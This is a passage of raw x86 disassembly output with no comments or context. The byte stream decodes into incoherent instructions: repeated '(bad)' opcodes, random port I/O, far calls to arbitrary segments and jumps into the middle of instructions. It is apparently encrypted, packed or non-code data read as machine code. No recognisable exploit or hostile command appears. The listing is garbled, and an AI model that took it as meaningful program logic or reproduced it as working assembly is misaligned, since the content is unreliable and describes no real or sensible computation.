  410e45:	ds sbb al,0x22
  410e48:	push   ss
  410e49:	xor    BYTE PTR [ebp+0x67],bh
  410e4c:	in     eax,dx
  410e4d:	pop    ecx
  410e4e:	loop   0x410e74
  410e50:	shr    BYTE PTR [edi],0x3
  410e53:	xor    al,0xd3
  410e55:	js     0x410e60
  410e57:	xchg   ecx,eax
  410e58:	fbld   TBYTE PTR [ecx+0x3]
  410e5b:	jno    0x410e3d
  410e5d:	arpl   WORD PTR [edx],cx
  410e5f:	mov    dl,0x4c
  410e61:	je     0x410dfc
  410e63:	sti    
  410e64:	sbb    edi,ebx
  410e66:	dec    ebx
  410e67:	out    dx,al
  410e68:	fmul   DWORD PTR [eax+edx*1+0x61]
  410e6c:	push   eax
  410e6d:	repz ja 0x410e70
  410e70:	cli    
  410e71:	push   ebx
  410e72:	dec    edx
  410e73:	xchg   esp,eax
  410e74:	and    DWORD PTR [ecx+0x6e],esi
  410e77:	or     ch,BYTE PTR [edx+0x76]
  410e7a:	cmp    edx,esp
  410e7c:	sbb    ah,ah
  410e7e:	shl    dh,0x6c
  410e81:	retf   0x3714
  410e84:	imul   ebx,DWORD PTR [edx],0xffffff94
  410e87:	pop    ebx
  410e88:	dec    esp
  410e89:	lods   eax,DWORD PTR ds:[esi]
  410e8a:	pop    esi
  410e8b:	mov    bh,0xbf
  410e8d:	js     0x410e85
  410e8f:	stos   BYTE PTR es:[edi],al
  410e90:	les    esp,FWORD PTR [eax-0x6b]
  410e93:	cmp    DWORD PTR [edi],ebp
  410e95:	imul   esp,DWORD PTR [eax-0x20eeb5b5],0xffffffb4
  410e9c:	jb     0x410ed1
  410e9e:	call   0xb91c:0xd436cddb
  410ea5:	addr16 jmp 0x7576:0xcb320706
  410ead:	ins    DWORD PTR es:[edi],dx
  410eae:	ret    0x774f
  410eb1:	mov    edx,0x2842e027
  410eb6:	daa    
  410eb7:	sub    DWORD PTR [ebx+0x62ffb6e8],esi
  410ebd:	push   edi
  410ebe:	lea    ebx,[esi-0xa759490]
  410ec4:	addr16 xchg ecx,eax
  410ec6:	sbb    al,0xb8
  410ec8:	cmp    eax,0xf773cfdb
  410ecd:	in     eax,dx
  410ece:	mov    dl,0x17
  410ed0:	fwait
  410ed1:	loop   0x410f4e
  410ed3:	ja     0x410ecf
  410ed5:	icebp  
  410ed6:	mov    ds:0x2125e383,eax
  410edb:	pop    ebx
  410edc:	push   edx
  410edd:	push   0xffffffab
  410edf:	rcl    BYTE PTR [ecx],cl
  410ee1:	inc    ebp
  410ee2:	pusha  
  410ee3:	sahf   
  410ee4:	or     BYTE PTR [edi+esi*8],bh
  410ee7:	fstp   QWORD PTR [ebp+eiz*4-0x5f]
  410eeb:	stos   DWORD PTR es:[edi],eax
  410eec:	retf   0xb0bf
  410eef:	outs   dx,DWORD PTR ds:[esi]
  410ef0:	push   esp
  410ef1:	and    esi,DWORD PTR [esi]
  410ef3:	and    eax,0x1b3cfca1
  410ef8:	cmp    BYTE PTR [esi],0xbf
  410efb:	jle    0x410eea
  410efd:	or     ch,BYTE PTR [eax-0x7c]
  410f00:	mov    al,ds:0x66d95ad9
  410f05:	int    0x4c
  410f07:	pop    es
  410f08:	fist   WORD PTR [edx]
  410f0a:	jnp    0x410f15
  410f0c:	leave  
  410f0d:	ja     0x410f2d
  410f0f:	cmp    esi,edx
  410f11:	test   eax,0xb1e29d21
  410f16:	(bad)  
  410f17:	or     eax,0x49d7ce22
  410f1c:	in     eax,dx
  410f1d:	cmp    ch,BYTE PTR [ebp-0x3f936319]
  410f23:	inc    ecx
  410f24:	ins    DWORD PTR es:[edi],dx
  410f25:	cli    
  410f26:	cmp    BYTE PTR [eax-0x18],cl
  410f29:	fwait
  410f2a:	mov    edx,0x33b3b2d2
  410f2f:	sub    DWORD PTR [ebp-0x3655967d],eax
  410f35:	jmp    0x410f95
  410f37:	sbb    ah,BYTE PTR [edi-0x10]
  410f3a:	xor    BYTE PTR [ecx-0x2b],0x6b
  410f3e:	push   esi
  410f3f:	and    DWORD PTR [edx+0x7f892308],eax
  410f45:	out    0x35,eax
  410f47:	adc    edx,eax
  410f49:	or     cl,BYTE PTR [ebp-0x35335371]
  410f4f:	pop    ds
  410f50:	jns    0x410f20
  410f52:	adc    eax,0xc3c43f09
  410f57:	mov    ebp,0xe6b44401
  410f5c:	shl    DWORD PTR [esi],1
  410f5e:	and    eax,0xc3ae6c1d
  410f63:	dec    edi
  410f64:	push   esp
  410f65:	ror    BYTE PTR [eax],cl
  410f67:	int3   
  410f68:	gs out 0x3f,al
  410f6b:	adc    ebp,DWORD PTR [ebp+ebp*1-0x60]
  410f6f:	int3   
  410f70:	int3   
  410f71:	pop    ecx
  410f72:	sbb    eax,0x74a7242a
  410f77:	aam    0xef
  410f79:	and    ah,ch
  410f7b:	mov    dl,0x27
  410f7d:	in     al,0x74
  410f7f:	and    BYTE PTR [ebx+0x1b],0x23
  410f83:	(bad)  
  410f84:	mov    ebx,0x16bdfb10
  410f89:	cmc    
  410f8a:	test   al,0x88
  410f8c:	bound  ebp,QWORD PTR [edi-0xff60cdc]
  410f92:	or     DWORD PTR [esp+ebp*8],0xa6b3735d
  410f99:	xchg   ebp,eax
  410f9a:	adc    al,0xcc
  410f9c:	sbb    eax,DWORD PTR [edi+0x36]
  410f9f:	leave  
  410fa0:	(bad)  
  410fa1:	sti    
  410fa2:	cs mov ecx,0x480d9eb5
  410fa8:	dec    esi
  410fa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410faa:	out    0xf1,eax
  410fac:	xor    DWORD PTR [edi-0x18],edi
  410faf:	push   ecx
  410fb0:	jmp    0x15cdaa41
  410fb5:	scas   al,BYTE PTR es:[edi]
  410fb6:	fisubr DWORD PTR [eax+0x6f762d07]
  410fbc:	dec    ecx
  410fbd:	pop    DWORD PTR [esp+edi*1+0x65112495]
  410fc4:	xchg   ebx,eax
  410fc5:	nop
  410fc6:	ja     0x411007
  410fc8:	xor    DWORD PTR [ebp+0x1bcaf83b],edi
  410fce:	js     0x410f74
  410fd0:	imul   edx,edi,0x9ec24552
  410fd6:	cmc    
  410fd7:	add    edi,ecx
  410fd9:	jmp    0x411261
  410fde:	int3   
  410fdf:	into   
  410fe0:	ror    esp,0xc1
  410fe3:	rcl    ecx,cl
  410fe5:	into   
  410fe6:	jbe    0x410f92
  410fe8:	inc    esp
  410fe9:	outs   dx,WORD PTR ds:[esi]
  410feb:	xchg   edi,eax
  410fec:	ins    BYTE PTR es:[edi],dx
  410fed:	jne    0x411054
  410fef:	pop    edx
  410ff0:	js     0x41106a
  410ff2:	in     eax,0x7e
  410ff4:	js     0x41106e
  410ff6:	pop    ss
  410ff7:	jno    0x41102a
  410ff9:	out    dx,eax
  410ffa:	xchg   esp,eax
  410ffb:	bound  edx,QWORD PTR [edx-0x7a]
  410ffe:	pop    es
  410fff:	stos   DWORD PTR es:[edi],eax
  411000:	inc    ecx
  411001:	aad    0xf4
  411003:	call   0xbaae:0xc4c1c569
  41100a:	fsubr  st,st(6)
  41100c:	(bad)  
  41100d:	pop    esp
  41100e:	aas    
  41100f:	cmp    eax,0x2d94f0a1
  411014:	mov    ecx,0x63892d14
  411019:	sub    bh,BYTE PTR [edx-0x68]
  41101c:	dec    ebp
  41101d:	ins    DWORD PTR es:[edi],dx
  41101e:	fwait
  41101f:	(bad)  
  411020:	cs daa 
  411022:	out    0x74,eax
  411024:	push   ss
  411025:	aaa    
  411026:	or     DWORD PTR [edi+0x347304cd],ecx
  41102c:	test   al,0xba
  41102e:	fsubr  DWORD PTR [eax-0x29]
  411031:	popf   
  411032:	cmp    esi,DWORD PTR [ecx+0x14]
  411035:	mov    al,ds:0xd9fde1a3
  41103a:	div    DWORD PTR [ebx-0x380b663]
  411040:	loope  0x411082
  411042:	(bad)  
  411043:	fld    DWORD PTR [edi-0x37]
  411046:	xchg   edx,eax
  411047:	pop    ecx
  411048:	aam    0x6b
  41104a:	lahf   
  41104b:	adc    cl,BYTE PTR [ebx]
  41104d:	mov    edx,0x4247b014
  411052:	and    DWORD PTR [ebx-0x31],ebp
  411055:	(bad)  
  411056:	out    0x1f,al
  411058:	test   DWORD PTR [edi],esi
  41105a:	daa    
  41105b:	xchg   ebp,eax
  41105c:	lods   eax,DWORD PTR ds:[esi]
  41105d:	mov    al,ds:0x2513ebe1
  411062:	out    dx,al
  411063:	sbb    esp,edi
  411065:	das    
  411066:	aas    
  411067:	push   cs
  411068:	retf   
  411069:	pusha  
  41106a:	shl    BYTE PTR [edx+0x2756c1e1],cl
  411070:	lods   al,BYTE PTR ds:[esi]
  411071:	ret    
  411072:	xchg   ebp,eax
  411073:	stc    
  411074:	mov    al,0xd3
  411076:	pop    eax
  411077:	pushf  
  411078:	sbb    DWORD PTR [edx],eax
  41107a:	xchg   ebp,eax
  41107b:	fdivr  DWORD PTR [ebp-0x3c]
  41107e:	adc    eax,0xa8902f35
  411083:	or     ebx,edx
  411085:	inc    eax
  411086:	(bad)  
  411087:	jmp    0xc4aee88f
  41108c:	mov    bh,0x3e
  41108e:	out    dx,eax
  41108f:	xchg   ecx,eax
  411090:	js     0x4110e9
  411092:	sub    eax,0x2b0f56bb
  411097:	fcmovbe st,st(5)
  411099:	in     eax,0x76
  41109b:	scas   eax,DWORD PTR es:[edi]
  41109c:	cmp    al,0x9e
  41109e:	xchg   edx,eax
  41109f:	into   
  4110a0:	jmp    0x411041
  4110a2:	mov    ah,0x76
  4110a4:	dec    ebx
  4110a5:	mov    ebx,0xda868e90
  4110aa:	in     al,0x82
  4110ac:	test   al,0x8
  4110ae:	outs   dx,DWORD PTR ds:[esi]
  4110af:	call   0x158:0x6e6e616f
  4110b6:	mov    esi,0x75c3e5bf
  4110bb:	in     al,0x7a
  4110bd:	hlt    
  4110be:	adc    al,0x63
  4110c0:	or     cl,ah
  4110c2:	sbb    al,bh
  4110c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110c5:	lods   eax,DWORD PTR ds:[esi]
  4110c6:	jge    0x41107d
  4110c8:	mov    DWORD PTR [ebx],eax
  4110ca:	push   esi
  4110cb:	out    dx,al
  4110cc:	pop    ecx
  4110cd:	and    edx,DWORD PTR [edi+0x23]
  4110d0:	sub    ah,bl
  4110d2:	xor    al,0xb2
  4110d4:	in     eax,0xdf
  4110d6:	les    edi,FWORD PTR [ebp-0x48b5d7f3]
  4110dc:	mov    ecx,0xff2f7e2c
  4110e1:	pop    ecx
  4110e2:	cs inc ebp
  4110e4:	mov    bl,0x16
  4110e6:	cmc    
  4110e7:	pushf  
  4110e8:	test   BYTE PTR ss:[ebx+0x7e],0x27
  4110ed:	jns    0x4110d6
  4110ef:	sbb    BYTE PTR [edi+0x5cb6b2a],ah
  4110f5:	sub    edx,ecx
  4110f7:	sbb    esi,DWORD PTR ds:0x3d430815
  4110fd:	pop    ebp
  4110fe:	rcl    BYTE PTR [ebp*2-0x2fd0a137],1
  411105:	pop    eax
  411106:	(bad)  
  411108:	jecxz  0x411161
  41110a:	mov    ds:0xaf02e95c,eax
  41110f:	frstor [bp+di+0x31ed]
  411114:	pop    eax
  411115:	inc    ebp
  411116:	int    0x8d
  411118:	push   0x1c30e058
  41111d:	inc    edx
  41111e:	scas   eax,DWORD PTR es:[edi]
  41111f:	imul   edx,DWORD PTR [ebp-0x49],0x3b0deda8
  411126:	adc    edx,esi
  411128:	ds mov al,0x52
  41112b:	ss mov edx,0x27487281
  411131:	adc    eax,0x904db185
  411136:	sti    
  411137:	pop    edi
  411138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411139:	leave  
  41113a:	fstp   DWORD PTR [edx+0x4d]
  41113d:	outs   dx,BYTE PTR ds:[esi]
  41113e:	out    0x99,al
  411140:	aas    
  411141:	fs or  eax,0xc5ac0c36
  411147:	mov    ebx,0xfbb7241b
  41114c:	rcl    al,0xda
  41114f:	loope  0x411118
  411151:	js     0x41118d
  411153:	or     al,0xad
  411155:	cmp    eax,0xa1889d14
  41115a:	push   eax
  41115b:	lahf   
  41115c:	push   cs
  41115d:	push   esp
  41115e:	popa   
  41115f:	pop    ds
  411160:	sbb    DWORD PTR [edx-0x6a],0xffffffe7
  411164:	ret    0x3ac
  411167:	dec    edi
  411168:	out    dx,al
  411169:	push   ebx
  41116a:	mov    ah,0x83
  41116c:	dec    ebp
  41116d:	mov    ebp,0xfb6f4d14
  411172:	pop    esi
  411173:	loop   0x411183
  411175:	push   edi
  411176:	dec    edx
  411177:	ror    bl,1
  411179:	mov    ecx,0x9d721f57
  41117e:	loopne 0x411121
  411180:	(bad)  [eax]
  411182:	jmp    0x411169
  411184:	(bad)  
  411185:	dec    esp
  411186:	adc    esi,0xd7abdbf7
  41118c:	push   edx
  41118d:	sbb    edi,ebx
  41118f:	dec    BYTE PTR [edi+ebp*8+0x32a8cf4b]
  411196:	mov    DWORD PTR [eax+eiz*1],esi
  411199:	js     0x4111b5
  41119b:	fs inc ecx
  41119d:	shl    ah,1
  41119f:	sbb    DWORD PTR [edx-0x70b09506],ebp
  4111a5:	fdivr  st(6),st
  4111a7:	int    0x2
  4111a9:	push   es
  4111aa:	jg     0x41118b
  4111ac:	adc    BYTE PTR [ebp+0x554896f1],cl
  4111b2:	adc    dl,BYTE PTR [esi]
  4111b4:	pop    ebx
  4111b5:	bound  ebp,QWORD PTR [esi+0x36a6e747]
  4111bb:	jmp    0x979a0215
  4111c0:	sub    eax,0x8cc1f11b
  4111c5:	jns    0x411203
  4111c7:	push   edi
  4111c8:	cwde   
  4111c9:	and    ah,BYTE PTR [edx-0x63b260e8]
  4111cf:	imul   edx,DWORD PTR [ebx+ebx*4],0xffffffc9
  4111d3:	push   ss
  4111d4:	mov    eax,ds:0x53022ed7
  4111d9:	sub    bl,BYTE PTR ds:0x9cf0e9a3
  4111df:	cmp    DWORD PTR [ebp-0x55],edx
  4111e2:	jge    0x41120b
  4111e4:	lds    esi,FWORD PTR [esi+0x3]
  4111e7:	cmp    BYTE PTR [ebp-0x2bbe385a],0xb1
  4111ee:	jecxz  0x411184
  4111f0:	loop   0x4111ff
  4111f2:	cmp    esp,edi
  4111f4:	mov    ds:0x9119b06f,al
  4111f9:	and    eax,0xb7ea243c
  4111fe:	inc    edx
  4111ff:	jbe    0x411210
  411201:	nop
  411202:	jp     0x41119d
  411204:	lea    edx,[ebp+eax*2-0x6a]
  411208:	call   0xe7c4:0x9da2f2cc
  41120f:	ins    DWORD PTR es:[edi],dx
  411210:	ret    
  411211:	(bad)  
  411212:	and    DWORD PTR [ebp-0x96cb90],ecx
  411218:	test   DWORD PTR [edi],ebp
  41121a:	jmp    0x191c2ba7
  41121f:	lods   al,BYTE PTR ds:[esi]
  411220:	mov    ecx,ss
  411222:	xor    eax,0xf4cabec5
  411227:	arpl   di,bp
  411229:	mov    esp,0xb3005afa
  41122e:	popf   
  41122f:	mov    ch,0xee
  411231:	call   0x3da8:0x9314498b
  411238:	arpl   WORD PTR [edx+0x23a4562f],si
  41123e:	mov    ds:0x70376f15,eax
  411243:	clc    
  411244:	xor    ebx,DWORD PTR [edi+0x28]
  411247:	popa   
  411248:	mov    fs,WORD PTR [edi]
  41124a:	(bad)  
  41124c:	pusha  
  41124d:	mov    al,0x41
  41124f:	sbb    esp,edx
  411251:	push   ebp
  411252:	in     al,0xbb
  411254:	jg     0x41127e
  411256:	inc    ebp
  411257:	out    dx,eax
  411258:	add    BYTE PTR ss:[edi-0x61],0xdc
  41125d:	mov    ds:0x3a17803,eax
  411262:	ror    DWORD PTR [edi],1
  411264:	scas   eax,DWORD PTR es:[edi]
  411265:	xlat   BYTE PTR ds:[ebx]
  411266:	jmp    0x4114ee
  41126b:	aas    
  41126c:	xlat   BYTE PTR ds:[ebx]
  41126d:	xlat   BYTE PTR ds:[ebx]
  41126e:	retf   
  41126f:	xlat   BYTE PTR ds:[ebx]
  411270:	retf   
  411271:	rcr    ebx,cl
  411273:	and    cl,ah
  411275:	or     BYTE PTR [eax-0x71],al
  411278:	and    BYTE PTR [edx],ch
  41127a:	mov    esp,0x78785fd2
  41127f:	in     eax,0x7e
  411281:	js     0x4112fb
  411283:	jmp    0x411288
  411285:	jbe    0x411267
  411287:	daa    
  411288:	test   eax,0xbc77a7af
  41128d:	test   al,0x59
  41128f:	(bad)  
  411290:	or     eax,0x37c04d27
  411295:	jmp    0x4112a8
  411297:	sub    eax,0x70bb2628
  41129c:	push   edx
  41129d:	sbb    al,0x1f
  41129f:	and    eax,0x7efa0fc8
  4112a4:	bound  edx,QWORD PTR [edi-0x31]
  4112a7:	nop
  4112a8:	addr16 xor eax,0x5c60dbee
  4112ae:	ins    BYTE PTR es:[edi],dx
  4112af:	mov    fs,WORD PTR [edx+0x48]
  4112b2:	xchg   ebp,eax
  4112b3:	js     0x411239
  4112b5:	push   ecx
  4112b6:	(bad)  
  4112b7:	jle    0x4112b2
  4112b9:	(bad)
  4112bc:	gs jle 0x4112de
  4112bf:	cwde   
  4112c0:	jbe    0x411263
  4112c2:	xor    BYTE PTR [esi+esi*2],ch
  4112c5:	dec    ebp
  4112c6:	loope  0x411263
  4112c8:	mov    ebp,0x5c135b37
  4112cd:	(bad)  
  4112ce:	cli    
  4112cf:	dec    ecx
  4112d0:	xor    al,0xb4
  4112d2:	loopne 0x411292
  4112d4:	push   edi
  4112d5:	fld    TBYTE PTR [ebp+0x75f428b0]
  4112db:	mov    bl,0xf1
  4112dd:	xchg   DWORD PTR ds:0x937b5baa,edi
  4112e3:	mov    ds:0xf4ee0c9b,al
  4112e8:	dec    edx
  4112e9:	popa   
  4112ea:	xor    BYTE PTR [ecx+0x4],0x4b
  4112ee:	(bad)  
  4112ef:	in     eax,dx
  4112f0:	cmp    ecx,eax
  4112f2:	push   eax
  4112f3:	cwde   
  4112f4:	inc    ebp
  4112f5:	dec    eax
  4112f6:	sub    al,0x7d
  4112f8:	push   ebx
  4112f9:	call   0xa471840d
  4112fe:	jmp    ecx
  411300:	(bad)  
  411301:	je     0x4112e2
  411303:	sti    
  411304:	dec    esp
  411305:	xchg   cl,dl
  411307:	sub    ch,cl
  411309:	pop    ecx
  41130a:	push   eax
  41130b:	xchg   ebp,eax
  41130c:	aaa    
  41130d:	push   es
  41130e:	and    dh,bh
  411310:	inc    ecx
  411311:	sub    ebp,DWORD PTR [edi-0x5f]
  411314:	and    ah,cl
  411316:	pop    esi
  411317:	ret    0xab7f
  41131a:	mov    al,0xf
  41131c:	add    DWORD PTR [edi+0x1c],0xffffffbd
  411320:	adc    eax,0x755e5cd
  411325:	mov    ecx,0xb6b76434
  41132a:	fcom   DWORD PTR [ebx-0x5c]
  41132d:	cs jno 0x411368
  411330:	mov    cl,0x6c
  411332:	adc    ebp,ebx
  411334:	push   edi
  411335:	mov    ds:0x25b7030a,eax
  41133a:	enter  0xdf6e,0xc6
  41133e:	lock imul esp,DWORD PTR ss:[edi],0xffffffd8
  411343:	cld    
  411344:	jmp    0x4112e0
  411346:	xchg   ebx,eax
  411347:	push   edi
  411348:	outs   dx,BYTE PTR ds:[esi]
  411349:	and    BYTE PTR [edi],0xaf
  41134c:	not    BYTE PTR [edx-0x9]
  41134f:	das    
  411350:	scas   al,BYTE PTR es:[edi]
  411351:	xor    BYTE PTR [ebx-0x43],0xcd
  411355:	loopne 0x41135b
  411357:	pop    esi
  411358:	cld    
  411359:	push   edi
  41135a:	and    DWORD PTR [ebx-0x65],esp
  41135d:	inc    eax
  41135e:	mov    esi,0x569d7b58
  411363:	sub    BYTE PTR [ebp-0x5716741e],cl
  411369:	clc    
  41136a:	cmc    
  41136b:	aad    0x35
  41136d:	mov    al,0x2c
  41136f:	pop    ecx
  411370:	scas   al,BYTE PTR es:[edi]
  411371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411372:	sub    eax,ebp
  411374:	cmp    BYTE PTR [ebp-0x59],0x40
  411378:	xor    bl,BYTE PTR [ecx+0x78]
  41137b:	pop    ds
  41137c:	sub    BYTE PTR [ecx],dl
  41137e:	mov    dh,0xe
  411380:	sub    al,0x83
  411382:	dec    esp
  411383:	test   al,0x60
  411385:	jp     0x411327
  411387:	cs and esp,0xffffffb8
  41138b:	or     BYTE PTR [ecx-0x305c3c7c],dl
  411391:	arpl   WORD PTR ds:0x143063f7,ax
  411397:	nop
  411398:	mov    ecx,0xcf746d7
  41139d:	xchg   ebp,eax
  41139e:	scas   al,BYTE PTR es:[edi]
  41139f:	pop    eax
  4113a0:	rcr    cl,1
  4113a2:	ret    0xbe91
  4113a5:	jnp    0x4113ec
  4113a7:	push   ebx
  4113a8:	inc    eax
  4113a9:	cwde   
  4113aa:	jno    0x41133f
  4113ac:	jecxz  0x4113cc
  4113ae:	popa   
  4113af:	in     al,0x97
  4113b1:	inc    edi
  4113b2:	mov    edx,ecx
  4113b4:	lods   eax,DWORD PTR ds:[esi]
  4113b5:	mov    ecx,0x82e3e162
  4113ba:	or     bh,al
  4113bc:	leave  
  4113bd:	adc    BYTE PTR [ebx],ch
  4113bf:	xor    DWORD PTR [esi+0x10],edi
  4113c2:	push   ss
  4113c3:	add    al,0x41
  4113c5:	ss ds push cs
  4113c8:	jl     0x411407
  4113ca:	out    0x6,eax
  4113cc:	push   ebx
  4113cd:	sub    eax,0x2ab5398e
  4113d2:	das    
  4113d3:	mov    al,ds:0xdf7c0b1c
  4113d8:	rcr    DWORD PTR [ebx-0x19],0xe3
  4113dc:	xor    eax,0xf042b747
  4113e1:	rcr    DWORD PTR [ecx+0x1fd039d6],1
  4113e7:	or     ch,BYTE PTR [ebp+0xaa052c1]
  4113ed:	outs   dx,BYTE PTR ds:[esi]
  4113ee:	inc    ecx
  4113ef:	push   0x90472d3b
  4113f4:	in     al,dx
  4113f5:	dec    si
  4113f7:	cmp    eax,0xf6fcca17
  4113fc:	xor    al,0xd8
  4113fe:	popa   
  4113ff:	data16 and BYTE PTR [ebx],0x22
  411403:	mov    edx,es
  411405:	inc    ecx
  411406:	fisubr WORD PTR [eax+esi*1+0x3f]
  41140a:	jge    0x4113e7
  41140c:	sub    eax,0x978e5fa7
  411411:	mov    bh,0x50
  411413:	cbw    
  411415:	mov    bh,0xcc
  411417:	dec    eax
  411418:	adc    DWORD PTR [edx],0x7
  41141b:	lods   eax,DWORD PTR ds:[esi]
  41141c:	lods   al,BYTE PTR ds:[esi]
  41141d:	jae    0x41144b
  41141f:	mov    dl,cl
  411421:	popf   
  411422:	out    0xe4,al
  411424:	test   BYTE PTR [eax+eiz*1+0x6a],ah
  411428:	(bad)  
  411429:	call   0xde048496
  41142e:	dec    esi
  41142f:	fcomp  QWORD PTR [edi]
  411431:	mov    ah,0x91
  411433:	retf   0x17d3
  411436:	(bad)  
  411437:	retf   
  411438:	jmp    0x4113d4
  41143a:	inc    edi
  41143b:	add    bh,cl
  41143d:	push   ds
  41143e:	inc    esp
  41143f:	push   ss
  411440:	jo     0x41140a
  411442:	lods   al,BYTE PTR ds:[esi]
  411443:	xor    BYTE PTR [esi-0x7b],ch
  411446:	add    eax,0x3bdf0a90
  41144b:	or     eax,0xa43adf84
  411450:	jg     0x4114b2
  411452:	jge    0x41145e
  411454:	jp     0x411466
  411456:	popf   
  411457:	cmp    bh,BYTE PTR [eax-0x59]
  41145a:	push   ss
  41145b:	mov    edi,0x4b4afaf4
  411460:	mov    esi,DWORD PTR [esi+edi*4-0x3caaecb1]
  411467:	or     al,0xd2
  411469:	jb     0x4114b3
  41146b:	inc    eax
  41146c:	mov    esi,0xbcf1ce9a
  411471:	sahf   
  411472:	fcomp  DWORD PTR [ebx]
  411474:	ret    
  411475:	aad    0x26
  411477:	sti    
  411478:	mov    ebp,0x948e9da3
  41147d:	push   ss
  41147e:	mov    eax,ds:0x52bb8566
  411483:	jecxz  0x4114be
  411485:	sbb    eax,ecx
  411487:	imul   ebx,edx,0x4111a7cd
  41148d:	stos   DWORD PTR es:[edi],eax
  41148e:	je     0x4114f5
  411490:	test   DWORD PTR [ebp-0x6c],ebp
  411493:	dec    ecx
  411494:	jecxz  0x411504
  411496:	test   al,0xf3
  411498:	xor    eax,0xd0e7aece
  41149d:	mov    edx,0x58fab10c
  4114a2:	inc    ecx
  4114a3:	inc    edx
  4114a4:	hlt    
  4114a5:	mov    ds:0x2b64e5b4,eax
  4114aa:	lds    eax,FWORD PTR [edi]
  4114ac:	shl    DWORD PTR [ebx],cl
  4114ae:	push   cs
  4114af:	mov    WORD PTR [eax-0x33],gs
  4114b2:	adc    BYTE PTR [ebx+0x8],ch
  4114b5:	mov    edx,0x54606745
  4114ba:	push   es
  4114bb:	mov    dh,0xdd
  4114be:	mov    eax,ebx
  4114c0:	imul   esi,DWORD PTR [ecx+0x33],0x40
  4114c4:	jne    0x4114f9
  4114c6:	sbb    edi,ebp
  4114c8:	push   0xffffffd3
  4114ca:	push   eax
  4114cb:	pop    esp
  4114cc:	jno    0x411505
  4114ce:	mov    ah,0x45
  4114d0:	push   ecx
  4114d1:	mov    al,ds:0xb73a388b
  4114d6:	mov    al,BYTE PTR [esi+0xed184ae]
  4114dc:	or     eax,0x166573d0
  4114e1:	pop    eax
  4114e2:	clc    
  4114e3:	adc    ch,BYTE PTR ds:0x4f16700b
  4114e9:	dec    esi
  4114ea:	repz pop edx
  4114ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114ed:	dec    DWORD PTR [ebx+0x5d8bf87d]
  4114f3:	lock sub ebx,edi
  4114f6:	cmp    ebx,edx
  4114f8:	ja     0x41178e
  4114fe:	jmp    0x411786
  411503:	(bad)  
  411504:	rol    edi,cl
  411506:	(bad)
  411509:	(bad)
  41150c:	xor    bl,BYTE PTR [edi+0x4e]
  41150f:	test   DWORD PTR cs:[edi+0x785dbfe0],esp
  411516:	js     0x4114fd
  411518:	jle    0x411592
  41151a:	js     0x4114c2
  41151c:	stos   BYTE PTR es:[edi],al
  41151d:	xor    al,0x55
  41151f:	cli    
  411520:	jae    0x411584
  411522:	xchg   esp,eax
  411523:	add    al,0xcc
  411525:	in     eax,0x94
  411527:	adc    al,0x7f
  411529:	imul   ecx,DWORD PTR [esi],0x28
  41152c:	lds    esi,FWORD PTR [ebp+0x31]
  41152f:	adc    al,0x9
  411531:	add    bl,BYTE PTR [ecx+0x36]
  411534:	fsub   DWORD PTR [esi-0x1e]
  411537:	cmp    eax,0x55eb06b2
  41153c:	xchg   edi,eax
  41153d:	call   0x3a17:0xeb154afe
  411544:	fnstsw WORD PTR [esi+0x643ff668]
  41154a:	lods   al,BYTE PTR ds:[esi]
  41154b:	out    0x97,eax
  41154d:	ror    BYTE PTR [edx+edx*1+0x2e],1
  411551:	in     al,dx
  411552:	push   ecx
  411553:	in     eax,0x70
  411555:	test   eax,0x50037e35
  41155a:	or     edx,DWORD PTR [edi+0x1faabd2b]
  411560:	jo     0x41157e
  411562:	jp     0x4114ec
  411564:	fild   WORD PTR [edi]
  411566:	adc    eax,0xd7c56f17
  41156b:	lods   eax,DWORD PTR ds:[esi]
  41156c:	jmp    0x303064ed
  411571:	pusha  
  411572:	stc    
  411573:	popf   
  411574:	inc    esi
  411575:	adc    al,0xd
  411577:	or     DWORD PTR [edx+ecx*2],esp
  41157a:	push   0xf3c09e07
  41157f:	in     eax,0xfc
  411581:	mov    bh,0x7c
  411583:	rol    DWORD PTR [eax-0xa],0x5d
  411587:	sub    BYTE PTR [esi+esi*4+0x382f19f5],ch
  41158e:	jmp    0x3945:0x19bd920d
  411595:	push   edi
  411596:	inc    edx
  411597:	push   ebx
  411598:	in     al,0x17
  41159a:	or     eax,0xd272382b
  41159f:	ja     0x4115f7
  4115a1:	xchg   ecx,eax
  4115a2:	jmp    0x1057:0x9bc2dddf
  4115a9:	faddp  st(5),st
  4115ab:	retf   0x3c0f
  4115ae:	scas   al,BYTE PTR es:[edi]
  4115af:	adc    ebp,DWORD PTR [eax-0xd035a2b]
  4115b5:	dec    esp
  4115b6:	es dec esp
  4115b8:	call   0x3531c5a6
  4115bd:	pop    esp
  4115be:	push   ebx
  4115bf:	retw   
  4115c1:	iret   
  4115c2:	push   esi
  4115c3:	in     eax,0xfd
  4115c5:	pop    ss
  4115c6:	addr16 and al,0x67
  4115c9:	ret    0x74a9
  4115cc:	push   0xffffffa2
  4115ce:	adc    al,0x8a
  4115d0:	and    BYTE PTR cs:[edx-0x2482e1de],ch
  4115d7:	jnp    0x411630
  4115d9:	mov    ebp,0x6b639fa
  4115de:	es std 
  4115e0:	stc    
  4115e1:	call   0x2265d717
  4115e6:	lds    ebx,FWORD PTR [edi-0x73]
  4115e9:	mov    edi,DWORD PTR [eax]
  4115eb:	xor    eax,0xcc354710
  4115f0:	push   esi
  4115f1:	outs   dx,BYTE PTR ds:[esi]
  4115f2:	mov    bl,0x50
  4115f4:	test   al,0xfc
  4115f6:	xor    ecx,0xb8fbd6e7
  4115fc:	out    0xd3,eax
  4115fe:	scas   eax,DWORD PTR es:[edi]
  4115ff:	push   es
  411600:	adc    DWORD PTR [ecx+0x43ba395d],ebp
  411606:	cwde   
  411607:	loope  0x4115b1
  411609:	rcl    esi,1
  41160b:	push   ebx
  41160c:	test   DWORD PTR [ecx+0x4c],ebx
  41160f:	lahf   
  411610:	and    al,0x16
  411612:	dec    esi
  411613:	and    DWORD PTR [edx-0x54],esi
  411616:	mov    ebx,0x87219915
  41161b:	jle    0x4115f5
  41161d:	je     0x411648
  41161f:	mov    WORD PTR [ebx+0x13],?
  411622:	icebp  
  411623:	sub    al,0xfb
  411625:	add    DWORD PTR [ebp-0x55e2c9b8],edx
  41162b:	mov    bl,0x37
  41162d:	pushf  
  41162e:	sub    bl,BYTE PTR [ebp+0x2ff43e93]
  411634:	and    al,0x78
  411636:	jno    0x41161a
  411638:	mov    eax,0xe27f9783
